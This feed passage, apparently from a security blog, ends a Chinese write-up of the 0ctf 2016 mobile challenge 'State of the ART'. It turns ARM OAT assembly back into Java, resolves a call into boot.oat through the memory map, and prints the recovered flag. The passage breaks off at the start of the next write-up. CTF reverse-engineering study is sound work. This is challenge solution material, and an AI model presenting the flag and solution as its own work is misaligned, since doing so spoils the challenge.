cmp     r5, r3</div><div class="line">0x00372056: f0808209    bcs.w   +1042 (0x0037246c)  // 对s5数组进行边界判断</div><div class="line">0x0037205a: f91c8005    UNKNOWN 17                  // ldrsb.w r8, [r12, r5]，也就是r8 = s5[r5]</div><div class="line">0x0037205e: f8da1008    ldr.w   r1, [r10, #8]</div><div class="line">0x00372062: ea860608    eor.w   r6, r6, r8          // r6 = s1[r5] ^ s5[r5]</div><div class="line">0x00372066: f3460607    UNKNOWN 52                  // SBFX.W    R6, R6, #0, #8</div><div class="line">0x0037206a: f11a000c    adds    r0, r10, #12</div><div class="line">0x0037206e: 428d        cmp     r5, r1</div><div class="line">0x00372070: f0808201    bcs.w   +1026 (0x00372476)  // 对s1数组进行边界判断</div><div class="line">0x00372074: 5546        strb    r6, [r0, r5]        // s1[r5] = s1[r5] ^ s5[r5]</div><div class="line">0x00372076: 1c6d        adds    r5, r5, #1</div><div class="line">0x00372078: 3c01        subs    r4, #1</div><div class="line">0x0037207a: f47fafab    bne.w   -170 (0x00371fd4)   // 循环，这里跳回去</div></pre></td></tr></table></figure></p>
<p>这段对应的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">for (int i = 0; i &lt; s1.length; i++) &#123;</div><div class="line">    if (s1[i] == 87) &#123;</div><div class="line">        s1[i] = 105;</div><div class="line">    &#125;</div><div class="line">    if (s1[i] == 50) &#123;</div><div class="line">        s1[i] = ~(123);</div><div class="line">    &#125;</div><div class="line">    s1[i] = (byte) (s1[i] ^ s5[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x00372080: f8da6008    ldr.w   r6, [r10, #8]   // r6 = s1.length</div><div class="line">0x00372084: f8d9e11c    ldr.w   lr, [r9, #284]  ; pAllocArrayResolved</div><div class="line">0x00372088: f8d78008    ldr.w   r8, [r7, #8]    // r8 = s2.length</div><div class="line">0x0037208c: 9900        ldr     r1, [sp, #0]</div><div class="line">0x0037208e: eb160608    adds.w  r6, r6, r8      // r6 = s1.length + s2.length</div><div class="line">0x00372092: 1c32        mov     r2, r6</div><div class="line">0x00372094: f64e0020    movw    r0, #59424</div><div class="line">0x00372098: f2c7005b    movt    r0, #28763</div><div class="line">0x0037209c: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>对应的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">byte[] d1 = new byte[s1.length + s2.length];    // [sp, #40]</div></pre></td></tr></table></figure></p>
<p>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0x0037209e: f8da2008    ldr.w   r2, [r10, #8]</div><div class="line">0x003720a2: 900a        str     r0, [sp, #40]</div><div class="line">0x003720a4: 2600        movs    r6, #0</div><div class="line">0x003720a6: 9800        ldr     r0, [sp, #0]</div><div class="line">0x003720a8: f04f0800    mov.w   r8, #0</div><div class="line">0x003720ac: 9216        str     r2, [sp, #88]</div><div class="line">0x003720ae: 9a16        ldr     r2, [sp, #88]</div><div class="line">0x003720b0: f8cd8010    str.w   r8, [sp, #16]</div><div class="line">0x003720b4: 68c0        ldr     r0, [r0, #12]</div><div class="line">0x003720b6: f24f0cd8    movw    r12, #61656</div><div class="line">0x003720ba: f850000c    ldr.w   r0, [r0, r12]</div><div class="line">0x003720be: 9205        str     r2, [sp, #20]</div><div class="line">0x003720c0: f8d0e028    ldr.w   lr, [r0, #40]</div><div class="line">0x003720c4: 9b0a        ldr     r3, [sp, #40]   // r3为d1数组对象</div><div class="line">0x003720c6: 4651        mov     r1, r10         // r1为s1数组对象</div><div class="line">0x003720c8: 1c32        mov     r2, r6          // r2 = 0</div><div class="line">0x003720ca: 47f0        blx     lr              // 这是执行什么函数？</div></pre></td></tr></table></figure></p>
<p>这里最后的跳转，lr的值是无法计算出来的。最开始我尝试对获取lr的过程进行分析，但是这里取值的过程绕了多次，因此放弃了这种方法。我们在整个文件中搜索<code>#61656</code>，找到下面一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">3: java.lang.Object[] android.support.v4.content.FileProvider.copyOf(java.lang.Object[], int) (dex_method_idx=2961)</div><div class="line">  DEX CODE:</div><div class="line">    0x0000: const/4 v1, #+0</div><div class="line">    0x0001: new-array v0, v3, java.lang.Object[] // type@2035</div><div class="line">    0x0003: invoke-static &#123;v2, v1, v0, v1, v3&#125;, void java.lang.System.arraycopy(java.lang.Object, int, java.lang.Object, int, int) // method@15411</div><div class="line">    ...</div><div class="line">    0x00216b14: 1c05        mov     r5, r0</div><div class="line">    0x00216b16: 1c38        mov     r0, r7</div><div class="line">    0x00216b18: 68c0        ldr     r0, [r0, #12]</div><div class="line">    0x00216b1a: 2200        movs    r2, #0</div><div class="line">    0x00216b1c: 9204        str     r2, [sp, #16]</div><div class="line">    0x00216b1e: f24f0cd8    movw    r12, #61656</div><div class="line">    0x00216b22: f850000c    ldr.w   r0, [r0, r12]</div><div class="line">    0x00216b26: 9605        str     r6, [sp, #20]</div><div class="line">    0x00216b28: f8d0e028    ldr.w   lr, [r0, #40]</div><div class="line">    0x00216b2c: 4641        mov     r1, r8</div><div class="line">    0x00216b2e: 2200        movs    r2, #0</div><div class="line">    0x00216b30: 1c2b        mov     r3, r5</div><div class="line">    0x00216b32: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>和上面的代码对比，不难发现执行的即为<code>java.lang.System.arraycopy</code>函数，因此前面汇编代码对应的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">System.arraycopy(s1, 0, d1, 0, s1.length);</div></pre></td></tr></table></figure></p>
<p>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">0x003720cc: f8da8008    ldr.w   r8, [r10, #8]</div><div class="line">0x003720d0: 68b8        ldr     r0, [r7, #8]</div><div class="line">0x003720d2: 2600        movs    r6, #0</div><div class="line">0x003720d4: 9016        str     r0, [sp, #88]</div><div class="line">0x003720d6: 9800        ldr     r0, [sp, #0]</div><div class="line">0x003720d8: 9a16        ldr     r2, [sp, #88]</div><div class="line">0x003720da: f8cd8010    str.w   r8, [sp, #16]</div><div class="line">0x003720de: 68c0        ldr     r0, [r0, #12]</div><div class="line">0x003720e0: f24f0cd8    movw    r12, #61656</div><div class="line">0x003720e4: f850000c    ldr.w   r0, [r0, r12]</div><div class="line">0x003720e8: 9205        str     r2, [sp, #20]</div><div class="line">0x003720ea: f8d0e028    ldr.w   lr, [r0, #40]</div><div class="line">0x003720ee: 9b0a        ldr     r3, [sp, #40]   //  r3为o1数组对象</div><div class="line">0x003720f0: 1c39        mov     r1, r7          //  r1为b2数组对象  </div><div class="line">0x003720f2: 1c32        mov     r2, r6          //  r2为0</div><div class="line">0x003720f4: 47f0        blx     lr              // 跳转System.arraycopy函数</div></pre></td></tr></table></figure></p>
<p>对应的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">System.arraycopy(s2, 0, d1, s2.length, s2.length);</div></pre></td></tr></table></figure></p>
<p>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">0x003720f6: 980e        ldr     r0, [sp, #56]       // r0为s3数组对象</div><div class="line">0x003720f8: 2604        movs    r6, #4</div><div class="line">0x003720fa: f04f0804    mov.w   r8, #4</div><div class="line">0x003720fe: 6881        ldr     r1, [r0, #8]</div><div class="line">0x00372100: 2904        cmp     r1, #4</div><div class="line">0x00372102: f24081c0    bls.w   +896 (0x00372486)   // 对s3数组进行边界判断</div><div class="line">0x00372106: f9908010    ldrsb.w r8, [r0, #16]       // r8 = s3[4]</div><div class="line">0x0037210a: 6882        ldr     r2, [r0, #8]</div><div class="line">0x0037210c: f1b80831    subs    r8, r8, #49         // r8 = s3[4] - 49</div><div class="line">0x00372110: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8</div><div class="line">0x00372114: 2a04        cmp     r2, #4</div><div class="line">0x00372116: f24081ba    bls.w   +884 (0x0037248e)   // 对s3数组进行边界判断</div><div class="line">0x0037211a: f8808010    strb    r8, [r0,#16]        // s3[4] = s3[4] - 49</div><div class="line">0x0037211e: 6883        ldr     r3, [r0, #8]</div><div class="line">0x00372120: 2603        movs    r6, #3</div><div class="line">0x00372122: f04f0803    mov.w   r8, #3</div><div class="line">0x00372126: 2b03        cmp     r3, #3</div><div class="line">0x00372128: f24081b6    bls.w   +876 (0x00372498)   // 对s3数组进行边界判断</div><div class="line">0x0037212c: f990800f    ldrsb.w r8, [r0, #15]       // r8 = s3[3]</div><div class="line">0x00372130: f8d0c008    ldr.w   r12, [r0, #8]</div><div class="line">0x00372134: f118082f    adds    r8, r8, #47         // r8 = s3[3] + 47</div><div class="line">0x00372138: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8</div><div class="line">0x0037213c: f1bc0f03    cmp.w   r12, #3</div><div class="line">0x00372140: f24081af    bls.w   +862 (0x003724a2)   // 对s3数组进行边界判断</div><div class="line">0x00372144: f880800f    strb    r8, [r0,#15]        // s3[3] = s3[3] + 47</div><div class="line">0x00372148: 6881        ldr     r1, [r0, #8]</div><div class="line">0x0037214a: 2602        movs    r6, #2</div><div class="line">0x0037214c: f04f0802    mov.w   r8, #2</div><div class="line">0x00372150: 2902        cmp     r1, #2</div><div class="line">0x00372152: f24081ab    bls.w   +854 (0x003724ac)   // 对s3数组进行边界判断</div><div class="line">0x00372156: f990800e    ldrsb.w r8, [r0, #14]       // r8 = s3[2]</div><div class="line">0x0037215a: 6882        ldr     r2, [r0, #8]</div><div class="line">0x0037215c: f118082a    adds    r8, r8, #42         // r8 = s3[2] + 42</div><div class="line">0x00372160: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8</div><div class="line">0x00372164: 2a02        cmp     r2, #2</div><div class="line">0x00372166: f24081a5    bls.w   +842 (0x003724b4)   // 对s3数组进行边界判断</div><div class="line">0x0037216a: f880800e    strb    r8, [r0,#14]        // s3[2] = s3[2] + 42</div><div class="line">0x0037216e: 6883        ldr     r3, [r0, #8]</div><div class="line">0x00372170: 2601        movs    r6, #1</div><div class="line">0x00372172: f04f0801    mov.w   r8, #1</div><div class="line">0x00372176: 2b01        cmp     r3, #1</div><div class="line">0x00372178: f24081a1    bls.w   +834 (0x003724be)   // 对s3数组进行边界判断</div><div class="line">0x0037217c: f990800d    ldrsb.w r8, [r0, #13]       // r8 = s3[1]</div><div class="line">0x00372180: f8d0c008    ldr.w   r12, [r0, #8]</div><div class="line">0x00372184: f1b80822    subs    r8, r8, #34         // r8 = s3[1] - 34</div><div class="line">0x00372188: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8</div><div class="line">0x0037218c: f1bc0f01    cmp.w   r12, #1</div><div class="line">0x00372190: f240819a    bls.w   +820 (0x003724c8)   // 对s3数组进行边界判断</div><div class="line">0x00372194: f880800d    strb    r8, [r0,#13]        // s3[1] = s3[1] - 34</div><div class="line">0x00372198: 6881        ldr     r1, [r0, #8]</div><div class="line">0x0037219a: 2600        movs    r6, #0</div><div class="line">0x0037219c: f04f0800    mov.w   r8, #0</div><div class="line">0x003721a0: 2900        cmp     r1, #0</div><div class="line">0x003721a2: f0008196    beq.w   +812 (0x003724d2)   // 对s3数组进行边界判断</div><div class="line">0x003721a6: f990800c    ldrsb.w r8, [r0, #12]       // r8 = s3[0]</div><div class="line">0x003721aa: 6882        ldr     r2, [r0, #8]</div><div class="line">0x003721ac: f118082e    adds    r8, r8, #46         // r8 = s3[0] + 46</div><div class="line">0x003721b0: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8</div><div class="line">0x003721b4: 2a00        cmp     r2, #0</div><div class="line">0x003721b6: f0008190    beq.w   +800 (0x003724da)   // 对s3数组进行边界判断</div><div class="line">0x003721ba: 9900        ldr     r1, [sp, #0]</div><div class="line">0x003721bc: f880800c    strb    r8, [r0,#12]        // s3[0] = s3[0] + 46</div></pre></td></tr></table></figure></p>
<p>对应的Java源码为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">s3[<span class="number">4</span>] = (<span class="keyword">byte</span>) (s3[<span class="number">4</span>] - <span class="number">49</span>);</div><div class="line">s3[<span class="number">3</span>] = (<span class="keyword">byte</span>) (s3[<span class="number">3</span>] + <span class="number">47</span>);</div><div class="line">s3[<span class="number">2</span>] = (<span class="keyword">byte</span>) (s3[<span class="number">2</span>] + <span class="number">42</span>);</div><div class="line">s3[<span class="number">1</span>] = (<span class="keyword">byte</span>) (s3[<span class="number">1</span>] - <span class="number">34</span>);</div><div class="line">s3[<span class="number">0</span>] = (<span class="keyword">byte</span>) (s3[<span class="number">0</span>] + <span class="number">46</span>);</div></pre></td></tr></table></figure></p>
<p>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x003721c0: f8d9e12c    ldr.w   lr, [r9, #300]  ; pAllocObjectInitialized</div><div class="line">0x003721c4: f64b10e0    movw    r0, #47584</div><div class="line">0x003721c8: f2c70049    movt    r0, #28745</div><div class="line">0x003721cc: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>其中pAllocObjectInitialized是初始化一个对象，类型通过r0确定，我们在整个文件搜索<code>movw    r0, #47584</code>和<code>movt    r0, #28745</code>，从而确定了此处对应的dalvik字节码为<code>new-instance v0, java.lang.StringBuilder</code>。<br>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">0x003721ce: f8d9e12c    ldr.w   lr, [r9, #300]  ; pAllocObjectInitialized</div><div class="line">0x003721d2: 9900        ldr     r1, [sp, #0]</div><div class="line">0x003721d4: 9012        str     r0, [sp, #72]</div><div class="line">0x003721d6: f64b00f0    movw    r0, #47344</div><div class="line">0x003721da: f2c7003e    movt    r0, #28734</div><div class="line">0x003721de: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>同样的方法，此处对应的dalvik字节码为<code>new-instance v1, java.lang.String</code>。<br>继续下一段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0x003721e0: 9a0e        ldr     r2, [sp, #56]   // r2为s3数组对象</div><div class="line">0x003721e2: 1c06        mov     r6, r0          // r6为上面新建的String对象</div><div class="line">0x003721e4: f2461ef9    movw    lr, #25081  </div><div class="line">0x003721e8: f2c72ea0    movt    lr, #29344</div><div class="line">0x003721ec: f64300b0    movw    r0, #14512</div><div class="line">0x003721f0: f2c70044    movt    r0, #28740</div><div class="line">0x003721f4: 1c31        mov     r1, r6</div><div class="line">0x003721f6: 47f0        blx     lr</div></pre></td></tr></table></figure></p>
<p>这里遇到一个问题，在整个文件中并没有找到匹配的地方，无法得知这里跳转到哪里。我们来计算下lr的值，通过<code>movw    lr, #25081</code>和<code>movt    lr, #29344</code>计算得到lr的值为0x72a061F9，也就是说这里跳转到了0x72a061F9这个地址。那么0x72a061F9这里又是什么呢？注意题目一共给我们提供了三个文件，到目前为止我们只用了b文件，a文件提供了内存布局信息，看a文件中的下面一段信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">70eee000-7298b000 r--p 00000000 b3:17 185109     /data/dalvik-cache/arm/system@framework@boot.oat</div><div class="line">7298b000-73e43000 r-xp 01a9d000 b3:17 185109     /data/dalvik-cache/arm/system@framework@boot.oat</div><div class="line">73e43000-73e44000 rw-p 02f55000 b3:17 185109     /data/dalvik-cache/arm/system@framework@boot.oat</div></pre></td></tr></table></figure></p>
<p>上面是boot.oat的内存布局，地址0x72a061F9刚好位于boot.oat的代码段，而boot.oat就是题目提供给我们的c文件。我们来算一算0x72a061F9对应到c文件中的地址。首先我们设置这样几个变量：offset_in_file（文件中的偏移），offset_in_memory（在内存中的偏移），virtual_start_addr（虚拟内存区域的起始地址），physics_start_addr（文件中的起始地址）。offset_in_file的计算公式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">offset_in_file = offset_in_memory - virtual_start_addr + physics_start_addr</div></pre></td></tr></table></figure></p>
<p>因此地址0x72a061F9对应的boot.oat文件中的地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">offset_in_file = 0x72a061F9 - 0x7298b000 + 0x01a9d000 - 1</div><div class="line">               = 0x1B181F8</div><div class="line">// 因为thumb的关系，所以需要-1</div></pre></td></tr></table></figure></p>
<p>ok，现在我们找到跳转的地址为boot.oat中的0x1B181F8，接下来我们需要得到boot.oat中的代码，使用oatdump即可。不幸的是我得到这样一个错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Failed to open oat file from &apos;/home/secauo/Android/0ctf_2016/state_of_the_art/state_of_the_art/c&apos;: Invalid oat magic for &apos;/home/secauo/Android/0ctf_2016/state_of_the_art/state_of_the_art/c&apos;</div></pre></td></tr></table></figure></p>
<p>好吧，oat magic错误，那么就是oat版本的原因了，从b文件得知，magic为039，因此对应的Android版本应该为5.0。再次使用Android5.0的oatdump，将结果保存为c.dump。由于未知的原因（或许是对齐？），地址差了0x1000，也就是为0x1B181F8 - 0x1000 = 0x1b171f8，查看c.dump，此处汇编为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">6: void java.lang.String.&lt;init&gt;(byte[]) (dex_method_idx=3180)</div><div class="line">  DEX CODE:</div><div class="line">    0x0000: const/4 v0, #+0</div><div class="line">    0x0001: array-length v1, v3</div><div class="line">    0x0002: invoke-direct &#123;v2, v3, v0, v1&#125;, void java.lang.String.&lt;init&gt;(byte[], int, int) // method@3182</div><div class="line">    0x0005: return-void</div><div class="line">  OatMethodOffsets (offset=0x0150b098)</div><div class="line">    code_offset: 0x01b171f9 </div><div class="line">    gc_map: (offset=0x015fbe3b)</div><div class="line">  OatQuickMethodHeader (offset=0x01b171e0)</div><div class="line">    mapping_table: (offset=0x018e15b7)</div><div class="line">    vmap_table: (offset=0x01a7c99a)</div><div class="line">    v3/r5, v1/r6, v2/r7, v65534/r8, v65535/r15</div><div class="line">  QuickMethodFrameInfo</div><div class="line">    frame_size_in_bytes: 64</div><div class="line">    core_spill_mask: 0x000081e0 (r5, r6, r7, r8, r15)</div><div class="line">    fp_spill_mask: 0x00000000 </div><div class="line">  CODE: (code_offset=0x01b171f9 size_offset=0x01b171f4 size=80)...</div><div class="line">    0x01b171f8: f5bd5c00    subs    r12, sp, #8192</div></pre></td></tr></table></figure></p>
<p>也就是说0x1b171f8（即内存地址0x72a061F9）指向<code>java.lang.String.&lt;init&gt;(byte[])</code>函数。回到b文件中check函数的分析，0x003721f6此处的’blx     lr’，也就是跳转到<code>java.lang.String.&lt;init&gt;(byte[])</code>函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0x003721e0: 9a0e        ldr     r2, [sp, #56]   // r2为s3数组对象</div><div class="line">0x003721e2: 1c06        mov     r6, r0          // r6为上面新建的String对象</div><div class="line">0x003721e4: f2461ef9    movw    lr, #25081  </div><div class="line">0x003721e8: f2c72ea0    movt    lr, #29344</div><div class="line">0x003721ec: f64300b0    movw    r0, #14512</div><div class="line">0x003721f0: f2c70044    movt    r0, #28740</div><div class="line">0x003721f4: 1c31        mov     r1, r6</div><div class="line">0x003721f6: 47f0        blx     lr             // 跳转到java.lang.String.&lt;init&gt;(byte[])</div></pre></td></tr></table></figure></p>
<p>对应的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">String str1 = new String(s3);</div></pre></td></tr></table></figure></p>
<p>后面类似的跳转到c文件的函数，将不再详细分析，本文直接给出结果，读者可按照上述方法自行分析。后续的Java源码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">StringBuilder sb1 = new StringBuilder(str1);</div><div class="line">sb1 = sb1.reverse();</div><div class="line">String str2 = sb1.toString();</div><div class="line">StringBuilder sb2 = new StringBuilder();</div><div class="line">String str3 = new String(d1);</div><div class="line">String str4 = str3.replace(&apos;S&apos;, &apos;e&apos;);</div><div class="line">String str5 = str4.replace(&apos;d&apos;, &apos;n&apos;);</div><div class="line">String str6 = str5.trim();</div><div class="line">StringBuilder sb3 = sb2.append(str6);</div><div class="line">StringBuilder sb4 = sb3.append(str2);</div><div class="line">String str7 = new String(s4);</div><div class="line">String str8 = str7.substring(2, 7);</div><div class="line">StringBuilder sb5 = sb4.append(str8);</div><div class="line">String str9 = sb5.toString();</div></pre></td></tr></table></figure></p>
<p>整合前面全部Java源码，最后得到获取Flag的Java代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">public String getFlag() &#123;</div><div class="line">    byte[] s1 = new byte[]&#123;0x78, 0x45, 0x78, 0x32, 0x57, 0x37&#125;;               // r10</div><div class="line">    byte[] s2 = new byte[]&#123;0x22, 0x29, 0x44, 0x55, 0x60, 0x33&#125;;               // r7</div><div class="line">    byte[] s3 = new byte[]&#123;0x17, (byte) 0x94, 0x35, 0x03, (byte) 0x90&#125;;                   // [sp, #56]</div><div class="line">    byte[] s4 = new byte[]&#123;0x45, 0x64, 0x5f, 0x41,0x52, 0x54, 0x7d&#125;;    // [sp, #60]</div><div class="line">    byte[] s5 = new byte[]&#123;0x58, 0x75, 0x1b, (byte) 0xf0, 0x0f, 0x4c&#125;;              // r11</div><div class="line">    byte[] s6 = new byte[]&#123;0x69, 0x0c, 0x1b, (byte) 0xbe, (byte) 0xf2, 0x49&#125;;         //[sp, #52]</div><div class="line"></div><div class="line">    for (int i = 0; i &lt; s2.length; ++i) &#123;</div><div class="line">        s2[i] = (byte) ((s2[i] + 54) ^ s6[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    for (int i = 0; i &lt; s1.length; i++) &#123;</div><div class="line">        if (s1[i] == 87) &#123;</div><div class="line">            s1[i] = 105;</div><div class="line">        &#125;</div><div class="line">        if (s1[i] == 50) &#123;</div><div class="line">            s1[i] = ~(123);</div><div class="line">        &#125;</div><div class="line">        s1[i] = (byte) (s1[i] ^ s5[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    byte[] d1 = new byte[s1.length + s2.length];    // [sp, #40]</div><div class="line">    System.arraycopy(s1, 0, d1, 0, s1.length);</div><div class="line">    System.arraycopy(s2, 0, d1, s2.length, s2.length);</div><div class="line"></div><div class="line">    s3[4] = (byte) (s3[4] - 49);</div><div class="line">    s3[3] = (byte) (s3[3] + 47);</div><div class="line">    s3[2] = (byte) (s3[2] + 42);</div><div class="line">    s3[1] = (byte) (s3[1] - 34);</div><div class="line">    s3[0] = (byte) (s3[0] + 46);</div><div class="line"></div><div class="line">    String str1 = new String(s3);</div><div class="line"></div><div class="line">    StringBuilder sb1 = new StringBuilder(str1);</div><div class="line">    sb1 = sb1.reverse();</div><div class="line">    String str2 = sb1.toString();</div><div class="line">    StringBuilder sb2 = new StringBuilder();</div><div class="line">    String str3 = new String(d1);</div><div class="line">    String str4 = str3.replace(&apos;S&apos;, &apos;e&apos;);</div><div class="line">    String str5 = str4.replace(&apos;d&apos;, &apos;n&apos;);</div><div class="line">    String str6 = str5.trim();</div><div class="line">    StringBuilder sb3 = sb2.append(str6);</div><div class="line">    StringBuilder sb4 = sb3.append(str2);</div><div class="line">    String str7 = new String(s4);</div><div class="line">    String str8 = str7.substring(2, 7);</div><div class="line">    StringBuilder sb5 = sb4.append(str8);</div><div class="line">    String str9 = sb5.toString();</div><div class="line"></div><div class="line">    return str9;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后的Flag为：<code>0ctf{1ea5n_2_rE_ART}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2016年0ctf中的mobile题目State of the ART的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>0ctf 2016 boomshakalaka writeup</title>
    <link href="http://ele7enxxh.com/0ctf-2016-Boomshakalaka-Writeup.html"/>
    <id>http://ele7enxxh.com/0ctf-2016-Boomshakalaka-Writeup.html</id>
    <published>2016-03-17T14:09:00.000Z</published>
    <updated>2016-03-23T06:24:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文为2016年0ctf中的mobile题目boomshakalaka的writeup。<a id="more"></a></p>
<p><img src="/images/0ctf-2016-boomshakalaka-writeup-1.png" alt="1"></p>
